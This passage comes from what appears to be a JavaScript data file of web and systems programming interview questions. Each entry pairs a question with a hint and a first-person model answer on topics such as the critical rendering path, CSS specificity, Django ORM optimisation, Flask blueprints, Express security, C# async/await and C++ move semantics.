      { q:'What is the critical rendering path and how does HTML structure affect it?', hint:'HTML parsed -> DOM -> CSSOM -> Render Tree -> Layout -> Paint. Render-blocking resources: CSS in <head>, JS with defer/async. First Contentful Paint. Avoid DOM depth.', answer:`The browser parses HTML into a DOM, fetches and parses CSS into a CSSOM, combines them into a Render Tree, then lays out and paints. CSS in <head> is render-blocking - the browser pauses rendering until the CSSOM is complete, which is why stylesheets belong in the head but external fonts should use font-display: swap. JavaScript without defer or async is also render-blocking and parser-blocking. I use <script defer> for most scripts to let HTML parsing complete first, and async for independent third-party scripts. Minimising DOM depth and avoiding large layout shifts (Core Web Vitals CLS) are key for perceived performance.` },
      { q:'What are data attributes and when do you use them?', hint:'data-* attributes store extra info on elements. Access via element.dataset.key. Use for lightweight DOM-to-JS communication, configuration, or targeting without class/id coupling.', answer:`Data attributes (data-*) store custom data directly on HTML elements without affecting presentation or semantics. They are useful for passing configuration to JavaScript without tightly coupling it to class names or IDs: <button data-action="delete" data-id="42"> allows a single event listener to read the action and ID without additional lookups. I use dataset.key to access them in JavaScript. They are also valuable for CSS selectors with attribute syntax: [data-active="true"] { ... }. I prefer data attributes over encoding state in class names when the data is genuinely associated with the element's content rather than its visual state.` },
      { q:'Explain the difference between <script>, <script defer>, and <script async>.', hint:'Normal <script>: blocks parsing. defer: executes after HTML parsed, in order. async: executes as soon as loaded, out of order. Use defer for app scripts, async for independent analytics.', answer:`A <script> tag without attributes blocks HTML parsing: the browser stops, downloads and executes the script, then resumes parsing. This is why placing scripts at the bottom of <body> was historically recommended. The defer attribute tells the browser to download the script in parallel with HTML parsing and execute it after the full HTML is parsed, preserving execution order for multiple deferred scripts. async downloads in parallel and executes immediately when ready, regardless of HTML parsing state or script order. I use defer for application scripts that depend on the DOM and on each other, and async for independent scripts like analytics that have no dependencies.` },
    ],
    css: [
      { q:'Explain the difference between Flexbox and CSS Grid. When do you use each?', hint:'Flexbox: one-dimensional (row OR column). Grid: two-dimensional (rows AND columns). Flexbox for component internals (nav bar, card layout). Grid for page-level layout.', answer:`Flexbox is one-dimensional - it aligns items along either a row or a column at a time, which makes it ideal for component internals: navigation bars, button groups, centering content, distributing space among items in a single direction. CSS Grid is two-dimensional - it simultaneously controls rows and columns, making it the right tool for overall page layout, card grids, and any design where items need to align on both axes. I use Grid for the macro layout of a page and Flexbox for the micro layout of each component within it. They are complementary and often both appear in a well-structured stylesheet.` },
      { q:'How does CSS specificity work? How do you resolve specificity conflicts?', hint:'Specificity cascade: inline > ID > class/attribute/pseudo-class > element/pseudo-element. Calculate as (0,0,0,0). !important overrides all. Avoid specificity wars with BEM/CSS Modules.', answer:`Specificity determines which CSS rule wins when multiple rules target the same element. It is calculated as four values: inline styles (1,0,0,0), ID selectors (0,1,0,0), class/attribute/pseudo-class selectors (0,0,1,0), and element/pseudo-element selectors (0,0,0,1). The rule with the highest specificity wins; equal specificity resolves by source order. I avoid specificity wars - the most common cause of CSS bugs - by using a flat naming convention like BEM (.card__title) or CSS Modules, which keep specificity low and predictable. I use !important only for utility classes that must always override component styles, never as a debugging shortcut.` },
      { q:'What is the CSS box model and what does box-sizing: border-box do?', hint:'Content + padding + border + margin. Default content-box: width = content only. border-box: width includes padding + border - more intuitive for layout.', answer:`The CSS box model defines how element dimensions are calculated. By default (content-box), the width and height properties apply only to the content area - padding and border are added on top, making the actual rendered size larger than specified. border-box changes this so width and height include padding and border, making sizing intuitive: a div with width: 300px and padding: 20px is actually 300px wide, not 340px. I apply * { box-sizing: border-box } globally in every project - it is an industry standard that prevents layout surprises when adding or changing padding values.` },
      { q:'How do CSS custom properties (variables) work and how do you use them for theming?', hint:'Declared with --name: value on :root or a container. Used with var(--name). Cascadable, inheritable. Override at component level for component-scoped theming. JavaScript can read/set them.', answer:`CSS custom properties are declared with a double-dash prefix (--primary-color: #3b82f6) and accessed with var(--primary-color). They cascade and inherit like regular CSS properties, which enables powerful theming: declaring all design tokens on :root makes them globally available, while overriding specific properties on a .dark-theme class switches the entire theme with a single class toggle. Unlike SCSS variables (compile-time), custom properties are runtime values that JavaScript can read and set with getPropertyValue and setProperty, enabling dynamic themes responding to user preferences. I structure custom properties as a design token system matching the design team's Figma variables.` },
      { q:'Explain CSS positioning - static, relative, absolute, fixed, and sticky.', hint:'Static: default document flow. Relative: offset from itself, children anchored. Absolute: positioned relative to nearest positioned ancestor. Fixed: viewport. Sticky: scrolls until threshold, then sticks.', answer:`Static (default) positions elements in the normal document flow with no offset properties. Relative offsets an element from its natural position without removing it from the flow - it also creates a positioning context for absolutely positioned descendants. Absolute removes the element from the document flow and positions it relative to the nearest ancestor with a non-static position. Fixed positions relative to the viewport, staying in place during scrolling - for headers and modals. Sticky is a hybrid: it scrolls with the document until it reaches a threshold (top: 0), then fixes in place until its parent scrolls out of view. I use sticky for table headers and sidebar navigation sections.` },
      { q:'What is BEM methodology and why do teams adopt it?', hint:'Block__Element--Modifier naming. Block: standalone component. Element: part of block (block__element). Modifier: variant (block--modifier). Eliminates specificity conflicts. Self-documenting CSS.', answer:`BEM (Block Element Modifier) is a CSS naming convention that makes stylesheets flat, predictable, and collision-free. A Block is a standalone component (.card), an Element is a part of a block (.card__title), and a Modifier is a variant (.card--featured, .card__title--large). Because all selectors are single classes, specificity is always 0,0,1,0 - no conflicts. BEM makes HTML self-documenting: reading .notification__icon--error immediately communicates the structure and intent. Teams adopt it because it scales: any developer can add styles to a component without worrying about accidentally overriding something elsewhere. CSS Modules and Scoped CSS in Vue provide similar isolation mechanically.` },
      { q:'How do CSS media queries and responsive design work? What is mobile-first development?', hint:'@media (min-width: 768px) {} - breakpoints. Mobile-first: base styles for small screens, enhance with min-width queries. max-width for overrides. viewport meta tag essential.', answer:`Media queries apply CSS rules conditionally based on device characteristics. The mobile-first approach writes base styles for the smallest viewport and uses min-width queries to progressively enhance for larger screens - this approach tends to produce leaner CSS and forces prioritisation of core content. The viewport meta tag (<meta name="viewport" content="width=device-width, initial-scale=1">) tells mobile browsers to use the device's actual width rather than a simulated desktop width. I define breakpoints based on where the content breaks rather than specific device sizes, use CSS custom properties for breakpoint values so they are centralised, and pair media queries with fluid typography (clamp()) and responsive images (srcset) for a truly adaptive experience.` },
    ],
    django: [
      { q:"Explain Django's MVT architecture and how it differs from MVC.", hint:"Model: data layer. View: business logic + template selection. Template: presentation. URL dispatcher routes requests. Django's View is MVC's Controller - Template is the View.", answer:`Django follows MVT - Model, View, Template. The URL dispatcher (urls.py) maps request paths to View functions or classes. The View contains business logic: it reads from Models, processes data, and passes it to a Template. The Template renders the final HTML. This maps to MVC with Django's View acting as the Controller and the Template as the View. Django's models handle both the data structure and the database query API through the ORM, keeping data access code in models rather than views. This clean separation means templates remain pure presentation logic, views remain coordination logic, and models encapsulate persistence.` },
      { q:'How does Django ORM work? How do you optimise queries for performance?', hint:'QuerySet API: filter, exclude, annotate, aggregate. Lazy evaluation. select_related for FK (SQL JOIN). prefetch_related for M2M/reverse FK (separate query). N+1 problem fix.', answer:`Django's ORM translates Python QuerySet methods into SQL. QuerySets are lazy - no SQL executes until the queryset is iterated, sliced, or converted to a list. The N+1 problem occurs when iterating a queryset and accessing a related object per row. select_related performs a SQL JOIN to fetch related ForeignKey or OneToOne objects in one query. prefetch_related handles many-to-many and reverse foreign key relationships with a separate optimised query and Python-level joining. I use only() and defer() to limit fetched columns for read-heavy list endpoints, annotate() and aggregate() for database-level computations, and django-debug-toolbar in development to inspect the exact queries a view generates.` },
      { q:'How do you build a REST API with Django REST Framework?', hint:'Serializer: model <-> JSON. APIView or ViewSet. Router auto-generates URLs. Authentication classes, permission classes. throttle_classes for rate limiting.', answer:`Django REST Framework provides Serializers that convert model instances to/from JSON with built-in validation. ModelSerializer generates fields from a model with minimal code. ViewSets group CRUD logic - I use ModelViewSet for standard CRUD and break away to APIView for custom logic. Routers auto-generate URL patterns from ViewSets, eliminating repetitive URL configuration. Authentication (JWT via simplejwt, Token Auth, Session Auth) and Permission classes (IsAuthenticated, IsAdminUser, custom object-level permissions) are composable per view. I add pagination (PageNumberPagination), filtering (django-filter), and throttling for production APIs. DRF's browsable API is invaluable during development.` },
      { q:'What is Django middleware and how do you write custom middleware?', hint:'Middleware: hooks into request/response cycle. process_request, process_response, process_view, process_exception. Stack applied in order. Use for auth, logging, security headers, request timing.', answer:`Django middleware is a callable that wraps the request/response cycle. It receives a request and either returns a response early (short-circuiting the view) or passes it to the next middleware and post-processes the response. I write middleware as classes with __init__(get_response) and __call__(request) methods. Common custom middleware I write: request ID injection for tracing, response time headers, automatic slow query logging when a threshold is exceeded, and custom authentication from API keys in request headers. The MIDDLEWARE setting in settings.py defines the stack order - middleware earlier in the list runs first on request and last on response, like layers of an onion.` },
      { q:"How does Django's authentication and authorisation system work?", hint:'User model (auth.User), login/logout views, @login_required decorator, permissions (add/change/delete/view per model), groups, custom user model (AbstractUser/AbstractBaseUser).', answer:`Django ships a complete authentication system: User model, session-based login/logout, password hashing (PBKDF2 by default), and per-model permissions. @login_required redirects unauthenticated users; @permission_required enforces specific permissions. I always extend the User model by subclassing AbstractUser at project start - retrofitting a custom user model later is painful because it requires data migrations. For APIs I replace session authentication with JWT. Django's permission framework (codename-based) handles fine-grained object-level permissions when combined with DRF's has_object_permission. Groups let me assign collections of permissions to user roles without individual permission management.` },
      { q:'How do you handle database migrations in Django safely in production?', hint:'makemigrations generates, migrate applies. Zero-downtime: AddField nullable first, backfill data, then add constraints. Never delete migration files from version control. Test on prod-size copy first.', answer:`Django migrations version-control schema changes alongside application code. The safest production migration pattern for adding a non-nullable column: first add it as nullable (no default required, no lock), deploy, backfill data in batches using a management command, then apply a migration to add the NOT NULL constraint. Renaming columns or tables requires a multi-step deploy: add the new name, migrate reads from both, remove the old name. I always test migrations on a database dump of production size - migrations fast in development can take hours on large tables. I also squash migrations periodically to keep the migration history manageable.` },
      { q:"What is Django's caching framework and how do you use it?", hint:'Backends: Memcached, Redis, local memory. Cache view with cache_page. Template fragment caching. Low-level: cache.set/get. Cache invalidation is the hard part.', answer:`Django's caching framework is backend-agnostic: I configure Redis or Memcached in CACHES settings and the same API works across backends. @cache_page(60*15) caches a view's response for 15 minutes. {% cache 300 sidebar user.id %} in templates caches expensive rendered fragments per user. For fine-grained control, cache.set(key, value, timeout) and cache.get(key) provide explicit control. Cache invalidation is the challenge - I use cache versioning or key namespacing so I can bust related cache keys atomically. For per-object caching I use cache keys like f"product:{product.id}" and invalidate in the model's post_save signal.` },
    ],
    flask: [
      { q:'How does Flask differ from Django and when do you choose Flask?', hint:'Flask: micro-framework, minimal by default. Choose Flask for: APIs, microservices, custom architecture. Django: batteries-included, opinionated. Flask requires more decisions but more flexibility.', answer:`Flask is a micro-framework providing routing, request handling, and templating without an ORM, authentication system, or admin panel. This makes it ideal for REST APIs, microservices, and use cases where you need full control over every component. Django provides a complete, opinionated framework with a built-in ORM, admin interface, authentication, and form handling. I choose Flask when I want a lightweight HTTP layer with specific library choices (SQLAlchemy instead of Django ORM, marshmallow or pydantic for serialisation) or when building a small service where Django's overhead is unjustified. Flask's simplicity also makes it excellent for ML model serving.` },
      { q:'Explain Flask application context and request context.', hint:'app context: current_app, g (per-request storage). Request context: request, session, g - pushed for each request and teardown after. Application factory pattern avoids circular imports.', answer:`Flask uses contexts to make objects like current_app and request available globally without passing them as parameters. The application context (pushed with app.app_context()) provides current_app (the Flask instance) and g (a namespace for storing request-scoped data). The request context is automatically pushed for each incoming HTTP request, making request (the incoming request data) and session available. The application factory pattern - create_app() returns the Flask instance - avoids circular imports and allows creating different instances for testing versus production, making each test run in a fresh application context.` },
      { q:'How do you structure a large Flask application with Blueprints?', hint:'Blueprint: mini-application with its own routes, templates, static files. Register on app with url_prefix. Enables modular code organisation. Combine with application factory pattern.', answer:`Blueprints divide a Flask application into modular components. Each blueprint has its own routes, error handlers, templates, and static files: auth_bp handles /auth/*, api_bp handles /api/*, admin_bp handles /admin/*. Blueprints are registered on the app with app.register_blueprint(auth_bp, url_prefix='/auth'). Combined with the application factory pattern, blueprints enable clean separation of concerns and make large Flask codebases navigable. I create one blueprint per major domain area, with each blueprint living in its own package containing its routes, models, schemas, and tests.` },
      { q:'How do you handle authentication in Flask? JWT vs session-based.', hint:'Session-based: Flask-Login + server-side session. JWT: flask-jwt-extended - stateless, scales horizontally. JWTs stored in httpOnly cookies or Authorization header. Token refresh pattern.', answer:`Flask-Login provides session-based authentication with @login_required, current_user, and server-side session management - appropriate for server-rendered applications. For APIs, Flask-JWT-Extended provides JWT authentication: the client sends credentials to /login and receives an access token (short-lived) and refresh token (long-lived). The access token is included in subsequent requests as Authorization: Bearer <token>. JWTs are stateless - no server-side session - which makes horizontal scaling trivial. I store JWTs in httpOnly cookies for browser clients (CSRF protection required) and in the Authorization header for non-browser API clients.` },
      { q:'How do you test Flask applications?', hint:'Flask test client (app.test_client()). pytest fixtures for app factory. test_request_context for unit testing context-dependent code. Separate test config (SQLite in-memory, disable CSRF).', answer:`Flask's test client simulates HTTP requests without a real server. I create a pytest fixture using the application factory with a test configuration: in-memory SQLite database, TESTING=True, and WTF_CSRF_ENABLED=False. The test client makes GET/POST requests and asserts on response status codes, JSON data, and redirects. For testing functions that use request or g, I use app.test_request_context() as a context manager to push a request context. I write unit tests for business logic (model methods, utility functions) and integration tests via the test client for the API endpoints.` },
      { q:'What is Flask-SQLAlchemy and how do you handle database migrations?', hint:'Flask-SQLAlchemy: ORM integration with app context. Alembic (via Flask-Migrate): migration files. db.create_all() for dev only. flask db migrate, flask db upgrade.', answer:`Flask-SQLAlchemy integrates SQLAlchemy with Flask's application context so the database session is tied to the request lifecycle and automatically committed or rolled back. Models inherit from db.Model with column definitions. Flask-Migrate wraps Alembic to provide migration management: flask db migrate generates a migration file by comparing the current model definitions to the database schema, and flask db upgrade applies it. I version migration files alongside application code - never use db.create_all() in production, which would fail on existing tables. I review generated migration files before applying them because auto-generation sometimes misses renamed columns or constraints.` },
      { q:'How do you deploy a Flask application to production?', hint:'WSGI server: Gunicorn or uWSGI (not Flask dev server). Reverse proxy: Nginx. Environment variables for secrets. Docker container. Health check endpoint. Logging to stdout for container environments.', answer:`Flask's built-in development server is single-threaded and not production-safe. For production, I serve Flask behind Gunicorn (gunicorn -w 4 app:app) with 2-4 workers per CPU core, behind an Nginx reverse proxy that handles SSL termination, static file serving, and rate limiting. All secrets - database URLs, secret keys - come from environment variables, never hardcoded. In containerised deployments, I package Gunicorn + Flask in a Docker image with a multi-stage build, configure structured JSON logging to stdout, and expose a /health endpoint that checks database connectivity for the orchestrator's health checks. Celery handles background tasks with Redis as the broker.` },
    ],
    express: [
      { q:'Explain Express middleware. How does the middleware pipeline work?', hint:'app.use() registers middleware. next() passes to next handler. Order matters. Error-handling middleware: four arguments (err, req, res, next). Router middleware scoped to routes.', answer:`Express middleware are functions with (req, res, next) signature that execute sequentially in the order they are registered. Each middleware either sends a response (ending the chain) or calls next() to pass control to the next middleware. This pipeline handles cross-cutting concerns: body parsing, authentication, logging, and rate limiting all run before route handlers. Error-handling middleware has four arguments (err, req, res, next) and only fires when next(err) is called or an error is thrown. I organise middleware into layers: global middleware (morgan logging, helmet security headers, cors) at the app level, and authentication middleware at the router level for protected route groups.` },
      { q:'How do you structure a production-grade Express application?', hint:'Separate routes, controllers, services, models. Router for feature groups. Error handling middleware at end. Config from environment variables. index.js vs app.js separation.', answer:`I separate the application into distinct layers: routes define URL patterns and delegate to controllers, controllers orchestrate service calls and format responses, services contain business logic, and models handle data access. I separate app.js (Express configuration, middleware, routes) from server.js (binds to port) so the app can be imported into tests without starting a server. Feature-based folder structure (/users, /products, /orders) keeps related files together. I use express.Router() for each feature group so middleware can be scoped, and register a global error-handling middleware at the end that catches all unhandled errors and formats them consistently.` },
      { q:'How do you handle errors in Express properly?', hint:'try/catch in async handlers (or express-async-errors). next(err) triggers error middleware. Centralised error handler formats response. Distinguish operational errors from programmer errors.', answer:`Async route handlers require explicit error propagation - an unhandled rejected Promise does not automatically reach Express's error middleware. I either wrap async handlers with a try/catch and call next(err), or use the express-async-errors library that patches Express to handle async errors automatically. The centralised error handler at the bottom of the middleware stack receives all errors: it checks the error type (validation error -> 422, not found -> 404, auth error -> 401, unexpected -> 500), logs unexpected errors with full stack traces, and returns a consistent JSON error body. Client-facing responses never expose internal error messages or stack traces.` },
      { q:'How do you secure an Express API?', hint:'helmet for HTTP headers. cors with whitelist. express-rate-limit. Input validation (joi, zod). Parameterised queries. JWT auth. Avoid eval(), sanitise user input.', answer:`Security in Express is layered. Helmet sets security-relevant HTTP headers (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options) in one line. CORS restricts cross-origin access to a whitelist of trusted origins. express-rate-limit prevents brute-force attacks on auth endpoints. All user input is validated and sanitised with Joi or Zod before reaching business logic - never trust req.body directly. SQL queries use parameterised statements (never string concatenation). JWT tokens are validated on every protected request. I audit npm dependencies with npm audit regularly and pin dependency versions to prevent supply chain compromises.` },
      { q:'How do you handle authentication and authorisation in Express?', hint:'JWT middleware: verify token, attach user to req.user. Role-based middleware: req.user.role check. Refresh token rotation. bcrypt for password hashing. Rate-limit auth endpoints.', answer:`JWT-based auth has two parts: an auth middleware that validates the token from the Authorization header using jsonwebtoken, decodes the payload, and attaches the user to req.user, and a role/permission middleware that checks req.user.role or specific permissions. Route-level attachment: router.use(authenticate) protects all routes in the router, with router.post('/sensitive', authorize('admin'), handler) for additional role checks. Passwords are hashed with bcrypt (cost factor 12) - never store plaintext or MD5/SHA-1 hashes. I implement refresh token rotation (issue a new refresh token on each use, invalidate the old one) to limit the exposure window of stolen tokens.` },
      { q:'How do you connect Express to a database and manage connection pooling?', hint:'MongoDB: Mongoose (connect once at startup). PostgreSQL: pg Pool with max connections. ORM: Sequelize/Prisma. Never create a new connection per request. Environment-based config.', answer:`Database connections are expensive to create, so I establish a connection pool at application startup and reuse connections across requests. For PostgreSQL I use the pg library's Pool with a max of 10-20 connections depending on the workload. For MongoDB I connect Mongoose once in app.js and let Mongoose manage the connection pool internally. ORMs like Prisma provide their own connection pool. I never import and connect to the database inside a route handler. Connection strings come from environment variables - never hardcoded. I also handle connection errors at startup (exit the process) and reconnect events to log database connectivity issues in production.` },
      { q:'What is the difference between REST and GraphQL in the context of Express?', hint:'REST: multiple endpoints, fixed response shape. GraphQL: single endpoint, client-specifies shape. express-graphql or Apollo Server adds GraphQL to Express. Choose based on client diversity and data complexity.', answer:`A REST API exposes resource-based endpoints (/users, /orders/:id) with fixed response shapes - clients take what the server gives. GraphQL exposes a single endpoint where the client specifies exactly which fields it needs in the query, eliminating over- and under-fetching. I add GraphQL to Express using Apollo Server (createHandler for Express 4 or native Express integration in Apollo Server 4). REST remains my default for simple, resource-based APIs where HTTP caching is important. I choose GraphQL when I have multiple clients with different data needs (web, mobile, third-party) and the server joins data from many sources that would otherwise require many REST round trips.` },
    ],
    'c#': [
      { q:'What are the key differences between value types and reference types in C#?', hint:'Value types (struct, int, bool): stored on stack, copied on assignment. Reference types (class, string): stored on heap, copied by reference. Boxing/unboxing for value types in object contexts.', answer:`Value types (int, double, bool, struct, enum) hold data directly and are stored on the stack. Assignment copies the value. Reference types (class, interface, delegate, string) store a reference to heap memory. Assignment copies the reference, so two variables can point to the same object. Boxing wraps a value type in a heap object; unboxing extracts it back - both incur a performance cost. Understanding this distinction prevents bugs like modifying a struct thinking it will affect the original, and helps with performance-sensitive code where struct usage avoids GC pressure.` },
      { q:'Explain async/await and the Task Parallel Library in C#. How does it differ from threads?', hint:'async/await: compiler transforms to state machine, continues on thread pool thread. Task: represents async operation. ConfigureAwait(false) for library code. Threads: OS-level, expensive to create.', answer:`async/await in C# transforms a method into a state machine at compile time - the method suspends at each await without blocking a thread, and resumes on a thread pool thread when the awaited operation completes. This differs fundamentally from creating new threads: threads are expensive OS resources consuming ~1MB of stack, while async operations can scale to thousands of concurrent operations with a small thread pool. Task<T> represents an in-progress or completed operation. ConfigureAwait(false) in library code prevents capturing the synchronisation context, avoiding deadlocks in ASP.NET Framework. I use async all the way up the call chain - mixing async and sync (with .Result or .Wait()) causes deadlocks.` },
      { q:'What is LINQ and how does it work internally?', hint:'Language Integrated Query: query collections with C# syntax. IEnumerable (LINQ to Objects), IQueryable (LINQ to SQL/EF - translated to SQL). Deferred execution. Method vs query syntax.', answer:`LINQ provides a unified query syntax for any data source implementing IEnumerable<T> or IQueryable<T>. LINQ to Objects operates on in-memory collections, executing lazily - the query only runs when iterated. LINQ to Entities (Entity Framework) works on IQueryable<T>, translating the expression tree to SQL that executes on the database server - the crucial difference is that unsupported operations only fail at runtime. Method syntax (list.Where(x => x.Age > 18).Select(x => x.Name)) and query syntax (from x in list where x.Age > 18 select x.Name) are equivalent. I always call .ToList() or .ToArray() to materialise results when I need to prevent multiple enumerations or query re-execution.` },
      { q:'What is the difference between abstract classes and interfaces in C#? When do you use each?', hint:'Interface: pure contract, multiple implementation, default interface methods (C# 8+). Abstract class: shared implementation + state. C# allows only single inheritance. Prefer interface for cross-cutting capabilities.', answer:`Interfaces define a contract without implementation - a class can implement multiple interfaces, enabling composition. Since C# 8, interfaces can have default method implementations, blurring the line slightly. Abstract classes can contain state (fields), constructors, and concrete method implementations, but a class can only inherit from one. I use interfaces for capabilities that unrelated classes share (IComparable, IDisposable, ILogger) and abstract classes when a family of related types shares implementation logic and state. In modern C#, the interface-first approach is preferred for dependency injection because it enables easy mocking and swapping of implementations.` },
      { q:'How does garbage collection work in .NET? How do you manage unmanaged resources?', hint:'Generational GC: Gen0/Gen1/Gen2. GC pauses (server GC vs workstation GC). IDisposable + using statement for unmanaged resources. Finalizers as backup. Avoid memory leaks: event handlers, static references.', answer:`.NET's generational GC divides the heap into Gen0 (short-lived), Gen1 (medium), and Gen2 (long-lived) generations. Most objects die young - Gen0 collections are fast and frequent. Promoting objects to higher generations makes them more expensive to collect. For unmanaged resources (file handles, database connections, native memory), implement IDisposable: the Dispose() method releases resources deterministically, and the using statement guarantees Dispose() is called even if exceptions occur. Finalizers (~ClassName) run non-deterministically as a safety net but add GC overhead. Common memory leak causes: subscribing to events without unsubscribing, holding references in static collections, and large object heap (LOH) fragmentation from large allocations.` },
      { q:'What are generics in C# and what are generic constraints?', hint:'Generics: type-safe reusable code without boxing. where T : class (reference type), where T : new() (parameterless constructor), where T : IComparable<T>. Covariance (out) and contravariance (in) for interfaces.', answer:`Generics allow writing type-safe, reusable code without the boxing overhead of object-based approaches. List<T>, Dictionary<TKey, TValue>, and Task<T> are all generic. Generic constraints restrict what types T can be: where T : class requires a reference type, where T : struct requires a value type, where T : new() requires a parameterless constructor, and where T : IRepository<T> requires implementing an interface. Covariance (IEnumerable<out T>) allows using IEnumerable<Dog> where IEnumerable<Animal> is expected. Contravariance (IComparer<in T>) allows the opposite direction. I use generics for repository patterns, result types (Result<T, TError>), and utility classes that work across types without sacrificing type safety.` },
      { q:'How does dependency injection work in ASP.NET Core?', hint:'Built-in DI container: AddTransient, AddScoped, AddSingleton. Constructor injection. IServiceCollection in Program.cs. Scoped lifetime: per HTTP request. Avoid captive dependencies.', answer:`ASP.NET Core has a built-in DI container configured in Program.cs via IServiceCollection. Three lifetimes: Transient creates a new instance every injection, Scoped creates one per HTTP request (per scope), and Singleton creates one for the application lifetime. Constructor injection is the standard pattern - the framework resolves and injects registered services automatically. I register services by their interface so consuming code depends on abstractions: builder.Services.AddScoped<IOrderService, OrderService>(). A captive dependency occurs when a singleton injects a scoped service, causing the scoped service to live as long as the singleton - the container throws at runtime if detected. The minimal API approach (Program.cs without Startup.cs) in .NET 6+ simplifies the bootstrap.` },
    ],
    'c++': [
      { q:'Explain RAII and smart pointers in C++. How do they prevent memory leaks?', hint:'RAII: resource acquisition in constructor, release in destructor. unique_ptr: sole ownership, move-only. shared_ptr: shared ownership with ref counting. weak_ptr: breaks circular refs. Prefer over raw new/delete.', answer:`RAII (Resource Acquisition Is Initialization) ties resource lifetime to object lifetime - when an object goes out of scope, its destructor releases the resource automatically. Smart pointers apply RAII to heap memory. std::unique_ptr has exclusive ownership and zero overhead over a raw pointer - when it goes out of scope, the object is deleted. std::shared_ptr uses reference counting for shared ownership - the last owner deletes the resource. std::weak_ptr observes a shared_ptr's resource without owning it, breaking circular references that would cause memory leaks. I use make_unique and make_shared (never raw new in modern C++) for exception safety - if a constructor throws after allocation but before the smart pointer takes ownership, the memory leaks with raw new but not with make_unique.` },
      { q:'What are move semantics and rvalue references in C++11? Why do they matter for performance?', hint:'lvalue: named, persistent. rvalue: temporary. Move constructor/assignment: transfers ownership instead of copying. std::move casts to rvalue. Avoids deep copies of strings, vectors, etc.', answer:`Move semantics allow transferring resources from a temporary (rvalue) to a new object instead of copying them - a vector move transfers the internal pointer, size, and capacity, leaving the source empty, in O(1) instead of O(n). The move constructor and move assignment operator take an rvalue reference (&&) and steal the source's resources. std::move is a cast that allows treating an lvalue as an rvalue, enabling moves from named objects. This is critical for performance: returning a vector from a function triggers NRVO or a move, not a copy. The rule of five (destructor, copy constructor, copy assignment, move constructor, move assignment) applies when you manage resources - define all five or use the compiler-generated defaults with = default.` },
      { q:'What are C++ templates and what is template metaprogramming?', hint:'Templates: generic programming, instantiated at compile time. Function templates, class templates. SFINAE. Variadic templates. constexpr. TMP: computation at compile time. std::enable_if for conditional types.', answer:`Templates generate type-specific code at compile time, providing zero-cost abstraction - no runtime overhead of virtual dispatch. Function templates (template<typename T> T max(T a, T b)) and class templates (template<typename T> class Stack) are instantiated for each type used. SFINAE (Substitution Failure Is Not An Error) allows conditional template instantiation: std::enable_if<std::is_integral<T>::value, T>::type enables a function only for integral types. Variadic templates (template<typename... Args>) enable functions like std::make_unique. Compile-time computation with constexpr and template metaprogramming can move runtime cost to compile time for performance-critical applications. Modern C++ (17/20) concepts replace SFINAE with more readable syntax.` },
      { q:'Explain virtual functions and the vtable in C++. What is the cost of virtual dispatch?', hint:'virtual: runtime polymorphism via vtable pointer per object. vtable: array of function pointers. Indirection cost: one pointer dereference + function pointer call. final/override keywords.', answer:`When a class has virtual functions, the compiler creates a vtable - an array of function pointers for each virtual function. Each object of that class carries a hidden pointer (vptr) to the vtable. A virtual function call dereferences the vptr to find the vtable, then calls through the function pointer - one extra indirection compared to a direct call. The cost is modest (~2ns on modern hardware) but prevents inlining and can cause branch mispredictions in tight loops. I use override to catch accidental signature mismatches, and final on classes or methods that should not be overridden. For performance-critical polymorphism in loops, I prefer static polymorphism (templates with CRTP) over virtual dispatch.` },
      { q:'What is undefined behaviour in C++ and how do you avoid it?', hint:'UB: dereferencing null/dangling pointers, signed integer overflow, out-of-bounds access, use-after-free, reading uninitialised variables. Tools: AddressSanitizer, UBSanitizer, Valgrind. Sanitizers in CI.', answer:`Undefined behaviour occurs when a program performs operations that the C++ standard does not define - the compiler is free to generate any code, often producing subtle, non-reproducible bugs. Common causes: dereferencing null or dangling pointers, out-of-bounds array access, signed integer overflow, use-after-free, and reading uninitialized variables. The compiler may optimise assuming UB never occurs, making bugs appear only in optimised builds. I use AddressSanitizer (detects memory errors), UBSanitizer (catches undefined arithmetic and pointer operations), and ThreadSanitizer (finds data races) in CI with all tests. Static analysers (clang-tidy, cppcheck) catch many issues at compile time. Moving to smart pointers, std::array, and standard library algorithms eliminates entire categories of UB.` },
      { q:'How do you handle multithreading in C++? What synchronisation primitives do you use?', hint:'std::thread, std::mutex, std::lock_guard/unique_lock (RAII). std::atomic for lock-free operations. std::condition_variable for wait/notify. std::future/promise for async results. Data races are UB.', answer:`C++ provides std::thread for spawning threads and a rich set of synchronisation primitives. std::mutex protects shared data - I always use std::lock_guard or std::unique_lock (RAII wrappers) rather than manual lock/unlock to guarantee release on exceptions. std::atomic<T> provides lock-free operations on simple types - compare_exchange_strong is the foundation of lock-free algorithms. std::condition_variable implements producer/consumer patterns with wait() and notify_one()/notify_all(). std::future and std::promise pass results between threads; std::async launches tasks and returns a future. Data races on non-atomic objects are undefined behaviour - I use ThreadSanitizer in CI to detect them. C++17 parallel algorithms provide an easy way to parallelise STL algorithms with execution policies.` },
      { q:'What is the difference between stack and heap allocation in C++? When do you choose each?', hint:'Stack: fast, automatic, limited size (~1-8MB). Heap: slow (new/delete), unlimited, manual management. Prefer stack for small, fixed-size. Heap for large, dynamic, or long-lived objects. Move semantics reduce heap cost.', answer:`Stack allocation is extremely fast - incrementing the stack pointer - and objects are automatically destroyed when the scope exits. The stack is limited (typically 1-8MB) and unsuitable for large objects or objects whose lifetime must extend beyond their declaring scope. Heap allocation (new/malloc) is slower, involves the allocator, and requires explicit deallocation (delete/free) or smart pointer management. I prefer stack allocation for small, fixed-size objects with clear lifetimes. I use heap allocation when: the object size is large (risk of stack overflow), the lifetime must outlive the current scope, the size is determined at runtime, or the object must be shared. std::vector allocates its elements on the heap but manages that allocation automatically, giving heap flexibility with stack-like ergonomics.` },
    ],
    php: [
      { q:'How does PHP handle object-oriented programming compared to Java or C#?', hint:'PHP OOP: classes, interfaces, traits (multiple inheritance alternative), abstract classes. Late static binding (static::). Magic methods (__construct, __toString, __get). Dynamically typed.', answer:`PHP supports full OOP with classes, interfaces, abstract classes, and traits. Traits solve PHP's single inheritance limitation by allowing code reuse across unrelated class hierarchies - a Timestampable trait can be used in any model class without inheritance. PHP's type system was historically weak but PHP 7+ added strict type declarations and PHP 8 added union types, named arguments, and constructor promotion. Magic methods (__get, __set, __call, __toString) enable dynamic behaviour but can be a source of confusion. Compared to Java and C#, PHP is interpreted and dynamically typed by default, making it faster to prototype but requiring more discipline for type safety in large codebases.` },
